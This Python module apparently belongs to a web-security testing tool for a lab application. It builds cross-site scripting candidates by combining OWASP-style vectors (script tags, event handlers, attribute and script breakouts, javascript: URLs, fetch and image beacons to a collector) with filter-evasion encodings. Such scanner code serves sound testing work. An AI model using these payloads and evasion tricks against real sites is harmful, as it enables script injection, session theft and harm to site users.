"""Payload grammar and candidate generator.

Produces test candidates for the *lab* app by combining:
  context wrappers   (see contexts.py)
  attack vectors      (OWASP XSS Filter Evasion Cheat Sheet families)
  translation layer   (character encodings browsers normalize)

A candidate is complete when it carries:
  - token:   a unique sentinel the detector keys on
  - beacon:  a unique collector URL; if the beacon is hit the vector executed
"""

from __future__ import annotations

import hashlib
import secrets
from dataclasses import dataclass, field
from urllib.parse import urlencode

from app.engine.contexts import Context, ContextSpec, CONTEXT_SPECS
from app.engine.encoders import (
    case_mix,
    html_dec_encode,
    html_hex_encode,
    js_hex_escape,
    js_string_mutation,
    js_unicode_escape,
)

Token = str


@dataclass(frozen=True)
class Vector:
    name: str
    category: str
    template: str            # may contain {TOKEN} and {BEACON}
    contexts: tuple[str, ...]  # context spec names this vector applies to
    weight: float = 1.0


VECTORS: tuple[Vector, ...] = (
    Vector("script_alert", "basic", "<script>alert('{TOKEN}')</script>", ("html_element", "dom_innerhtml", "attr_double", "attr_single", "attr_unquoted")),
    Vector("img_onerror", "event_handler", "<img src=x onerror=alert('{TOKEN}')>", ("html_element", "dom_innerhtml", "attr_double", "attr_single", "attr_unquoted")),
    Vector("svg_onload", "event_handler", "<svg onload=alert('{TOKEN}')>", ("html_element", "dom_innerhtml", "attr_double", "attr_single", "attr_unquoted")),
    Vector("body_onload", "event_handler", "<body onload=alert('{TOKEN}')>", ("html_element", "dom_innerhtml", "attr_double", "attr_single", "attr_unquoted")),
    Vector("details_ontoggle", "event_handler", "<details open ontoggle=alert('{TOKEN}')>", ("html_element", "dom_innerhtml")),
    Vector("input_autofocus", "event_handler", "<input autofocus onfocus=alert('{TOKEN}')>", ("html_element", "dom_innerhtml")),
    Vector("iframe_srcdoc", "iframe", '<iframe srcdoc="<script>alert(\'{TOKEN}\')</script>"></iframe>', ("html_element", "dom_innerhtml", "attr_double", "attr_single")),
    Vector("javascript_href", "scheme", "javascript:alert('{TOKEN}')", ("attr_url", "url_query", "url_path")),
    Vector("attr_breakout_double", "breakout", '"><img src=x onerror=alert(\'{TOKEN}\')>', ("attr_double", "attr_single", "attr_unquoted", "attr_url")),
    Vector("attr_breakout_single", "breakout", "'><img src=x onerror=alert('{TOKEN}')>", ("attr_double", "attr_single", "attr_unquoted", "attr_url")),
    Vector("attr_unquoted_breakout", "breakout", "x onerror=alert('{TOKEN}')", ("attr_unquoted",)),
    Vector("attr_autofocus_onfocus", "event_handler", '" autofocus onfocus=alert(\'{TOKEN}\') x="', ("attr_double", "attr_single", "attr_unquoted")),
    Vector("script_breakout_sq", "breakout", "';alert('{TOKEN}');//", ("script_string",)),
    Vector("script_breakout_dq", "breakout", '";alert(\'{TOKEN}\');//', ("script_string",)),
    Vector("script_newline", "breakout", "%0aalert('{TOKEN}')//", ("script_string",)),
    Vector("js_breakout", "breakout", "</script><script>alert('{TOKEN}')</script>", ("script_string",)),
    Vector("dom_clobber", "dom", "<img src=x id=x onerror=document.body.setAttribute('data-xss','{TOKEN}')>", ("dom_innerhtml", "html_element")),
    Vector("beacon_img", "beacon", "<img src=x onerror=\"new Image().src='{BEACON}'\">", ("html_element", "dom_innerhtml", "attr_double", "attr_single", "attr_unquoted")),
    Vector("beacon_script", "beacon", "';new Image().src='{BEACON}';//", ("script_string",)),
    Vector("beacon_href", "beacon", "javascript:new Image().src='{BEACON}'", ("attr_url", "url_query", "url_path")),
    Vector("beacon_fetch", "beacon", "fetch('{BEACON}')//", ("script_string", "url_query", "url_path")),
    Vector("beacon_js_url", "beacon", "javascript:fetch('{BEACON}')", ("attr_url", "url_query", "url_path")),
)


# Strategy droids: (label, applicable context kinds, transform(template, vector_name))
def _strategy_raw(tpl: str, name: str) -> str:
    return tpl


def _strategy_tagcase(tpl: str, name: str) -> str:
    tags = ["script", "img", "svg", "body", "details", "input", "iframe",
            "onerror", "onload", "onfocus", "ontoggle", "srcdoc", "autofocus"]
    return case_mix(tpl, *tags)


def _strategy_js_keyword(tpl: str, name: str) -> str:
    return js_string_mutation(tpl)


def _strategy_js_hex(tpl: str, name: str) -> str:
    return js_hex_escape(tpl)


def _strategy_js_unicode(tpl: str, name: str) -> str:
    return js_unicode_escape(tpl)


def _strategy_html_hex(tpl: str, name: str) -> str:
    return html_hex_encode(tpl)


def _strategy_html_dec(tpl: str, name: str) -> str:
    return html_dec_encode(tpl)


def _strategy_url(tpl: str, name: str, double: bool = False) -> str:
    from urllib.parse import quote

    def enc(s: str) -> str:
        return quote(s, safe="")

    s = enc(tpl)
    return enc(s) if double else s


def _strategy_attr_scheme(tpl: str, name: str) -> str:
    # Entity-encode only the letters of a `javascript:` scheme keyword; the
    # URL parser decodes references before the scheme check in href handling.
    out = tpl.replace("javascript:", "jav&#x61;script:")
    out = out.replace("JAVASCRIPT:", "JAV&#x41;SCRIPT:")
    return out


STRATEGIES: tuple[tuple[str, tuple[Context, ...], object], ...] = (
    ("raw", (Context.HTML, Context.ATTR, Context.SCRIPT, Context.URL, Context.DOM), _strategy_raw),
    ("tagcase", (Context.HTML, Context.ATTR, Context.DOM), _strategy_tagcase),
    ("js_keyword", (Context.SCRIPT, Context.URL, Context.DOM), _strategy_js_keyword),
    ("js_hex", (Context.SCRIPT,), _strategy_js_hex),
    ("js_unicode", (Context.SCRIPT, Context.URL), _strategy_js_unicode),
    ("html_hex", (Context.HTML, Context.ATTR, Context.DOM), _strategy_html_hex),
    ("html_dec", (Context.HTML, Context.ATTR, Context.DOM), _strategy_html_dec),
    ("url", (Context.URL,), lambda t, n: _strategy_url(t, n)),
    ("double_url", (Context.URL,), lambda t, n: _strategy_url(t, n, double=True)),
    ("attr_scheme", (Context.ATTR, Context.URL), _strategy_attr_scheme),
)


@dataclass
class Candidate:
    id: str
    vector_name: str
    category: str
    context: ContextSpec
    strategy: str
    token: str
    payload: str                      # the literal injection string
    beacon: bool
    weight: float
    base_url: str = ""
    query_params: dict = field(default_factory=dict)

    @property
    def proof_url(self) -> str:
        separator = "&" if "?" in self.base_url else "?"
        params = urlencode({**self.query_params, "__xtest": self.id})
        return f"{self.base_url}{separator}{params}"

    def fingerprint(self) -> str:
        return hashlib.sha256(self.payload.encode()).hexdigest()[:12]


def _make_token() -> str:
    return f"xtok_{secrets.token_hex(5)}"


def build_candidates(
    context_kinds: list[Context],
    base_url: str,
    token: str | None = None,
    beacon_base: str | None = None,
    max_payloads: int = 400,
) -> list[Candidate]:
    """Expand vectors × strategies × contexts into a bounded candidate list."""
    token = token or _make_token()
    kinds = [Context(k) if isinstance(k, str) else k for k in context_kinds]
    specs: list[ContextSpec] = []
    for k in kinds:
        specs.extend(CONTEXT_SPECS.get(k) or [])

    candidates: list[Candidate] = []
    seen: set[tuple[str, str]] = set()

    for spec in specs:
        for vector in VECTORS:
            if spec.name not in vector.contexts:
                continue
            for label, ctx_kinds, transformer in STRATEGIES:
                if spec.kind not in ctx_kinds:
                    continue
                if "script" in label and "script" not in vector.name and vector.category in ("breakout",):
                    continue
                filled = vector.template.replace("{TOKEN}", token)
                cid = secrets.token_hex(6)
                if "{BEACON}" in vector.template:
                    if not beacon_base:
                        continue
                    beacon_url = f"{beacon_base.rstrip('/')}/{cid}"
                    filled = filled.replace("{BEACON}", beacon_url)
                payload = transformer(filled, vector.name) if callable(transformer) else filled
                if len(payload) > 1500:
                    continue
                key = (spec.name, payload[:90])
                if key in seen:
                    continue
                seen.add(key)
                candidates.append(
                    Candidate(
                        id=cid,
                        vector_name=vector.name,
                        category=vector.category,
                        context=spec,
                        strategy=label,
                        token=token,
                        payload=payload,
                        beacon=("{BEACON}" in vector.template and bool(beacon_base)),
                        weight=vector.weight,
                        base_url=base_url,
                    )
                )
                if len(candidates) >= max_payloads:
                    break
            if len(candidates) >= max_payloads:
                break
        if len(candidates) >= max_payloads:
            break

    return candidates